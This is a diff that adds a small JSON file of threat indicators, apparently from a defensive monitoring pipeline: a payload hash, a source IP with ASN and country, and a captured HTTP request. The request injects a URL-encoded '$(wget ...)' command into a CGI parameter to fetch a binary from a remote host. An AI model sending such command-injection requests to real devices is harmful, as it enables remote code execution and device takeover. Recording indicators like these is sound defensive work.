@@ -1,0 +1,21 @@
+[
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "POST /cgi-bin/operator/servetest?cmd=ntp&ServerName=%24%28wget%20http%3A%2F%2F31[.]56[.]39.XXX%2Fmemory_bin_dir%2Fmemory_load"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "635bb05d3a41eb2b3d57a727aa900a62fc54c295cac8bed5a3ea4acbc24dff18"
+  },
+  {
+    "asn": "OXAHOST",
+    "country": "Tunisia",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "102[.]204[.]206.XXX"
+  }
+]
